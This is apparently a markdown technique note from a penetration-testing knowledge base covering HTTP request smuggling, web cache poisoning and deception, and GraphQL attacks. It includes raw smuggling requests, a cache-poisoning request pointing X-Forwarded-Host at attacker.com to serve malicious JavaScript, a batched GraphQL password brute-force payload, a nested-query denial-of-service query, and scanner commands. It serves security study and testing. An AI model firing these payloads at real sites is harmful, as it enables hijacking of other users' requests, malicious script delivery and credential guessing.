---
category: technique
title: "Advanced Web Techniques - Request Smuggling, Cache Poisoning, GraphQL"
tags: [request-smuggling, http-desync, cache-poisoning, graphql, web-cache, h2c, chunked-encoding, web-cache-deception, cdn]
---

# Advanced Web Techniques

These techniques require understanding of HTTP internals and caching behavior. They're high-value because automated scanners miss them, and developers rarely think about them.

---

## HTTP Request Smuggling (HTTP Desync)

When a front-end proxy and back-end server disagree on where one HTTP request ends and the next begins, you can "smuggle" a request prefix that gets prepended to another user's request.

The disagreement usually comes from handling `Content-Length` vs `Transfer-Encoding: chunked` differently.

**CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):**
```http
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):**
```http
POST / HTTP/1.1
Host: victim.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Impact:** Bypass access controls (smuggle a request to an internal-only path), capture other users' requests (smuggle a partial request that gets completed by the next victim's request), XSS via response queue poisoning.

**Detection:**
```bash
# Use smuggler.py for automated detection
python3 smuggler.py -u https://victim.com/

# Or manually: send a CL.TE probe and check for time delay
# Back-end hangs waiting for the rest of a chunked body that won't come
```

**HTTP/2 Downgrade Smuggling (h2.CL, h2.TE):** If the front-end terminates H2 and converts to H1 to the back-end, inject `Transfer-Encoding: chunked` or a discrepant `Content-Length` into the H2 request headers. H2 headers have no concept of TE so the front-end ignores it, but the H1 back-end obeys it.

---

## Web Cache Poisoning

Caches store responses based on cache keys (usually URL + certain headers). If the response includes unsanitized content from a non-keyed input, you can poison the cache for all users.

**Common non-keyed inputs that get reflected:**
- `X-Forwarded-Host` - often included in redirects or canonical URLs
- `X-Forwarded-Scheme`, `X-Forwarded-Proto`
- `X-Original-URL`, `X-Rewrite-URL` - path manipulation in some frameworks
- `Origin` - CORS headers
- Query string parameters (if cache strips them for keying but back-end reflects them)

**Attack pattern:**
```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com

# If response contains:
<link href="https://attacker.com/static/app.js">
# Then the poisoned response is cached and served to all users
# -> serve malicious JS from attacker.com
```

**Fat GET smuggling for cache poisoning:** If the cache keys the GET URL but the back-end processes a POST body, a "fat GET" with a body can poison the cache with content derived from the POST body.

---

## Web Cache Deception

The inverse of cache poisoning: trick the cache into storing a response that should be private.

**Pattern:** Append a static-looking path to a dynamic URL:
```
https://victim.com/account/profile/nonexistent.css
```

If the cache rules say "cache .css files" and the back-end ignores the extra path and serves the authenticated user's profile page, the cache stores the private page and serves it to unauthenticated users who request the same URL.

**Detection:** Check if appending static extensions to auth-required pages returns the same content AND gets cached.

---

## GraphQL Attacks

GraphQL exposes a single endpoint but the full schema is often discoverable via introspection.

**Introspection to schema dump:**
```bash
# Extract full schema
python3 graphql-voyager/server.py  # visualize
# Or use InQL / graphql-cop
graphql-cop -t https://victim.com/graphql
```

**Common misconfigurations:**

*Introspection enabled in production* - leaks all types, fields, mutations. If introspection is blocked, try capitalization tricks: `__SCHEMA`, `__schema` in aliases.

*Batch attacks:* Send an array of operations in one request to bypass rate limiting.
```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  ...
]
```

*Field suggestions bypass introspection block:* GraphQL error messages suggest similar field names even when introspection is off.
```graphql
{ __typename unknownField }
# Error: "Did you mean 'secretField'?"
```

*Mass assignment via input types:* If an `UpdateUser` input type has undocumented fields (like `role`), they might be writable even if not documented in the UI.

*Nested query DoS / depth limit bypass:* Deeply nested queries can exhaust resources. Look for missing depth/complexity limits.

```graphql
{ user { friends { friends { friends { email } } } } }
```

*IDOR through Global IDs:* GraphQL often exposes base64-encoded global IDs like `VXNlcjoxMjM=` (= `User:123`). These IDs sometimes allow cross-type confusion - decoding and re-encoding with a different type prefix may return another object.

**Mutation CSRF:** If a GraphQL endpoint accepts `application/x-www-form-urlencoded` or `text/plain` content types, mutations might be triggerable via CSRF from any page.

---

## Tools

```bash
# Request smuggling
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com

# Web cache poisoning
# Use Param Miner Burp extension to find unkeyed inputs
# Or manually fuzz X-Forwarded-Host, X-Forwarded-Scheme

# GraphQL
pip install graphql-cop
graphql-cop -t https://target.com/graphql
# InQL Burp extension for interactive GraphQL testing
```
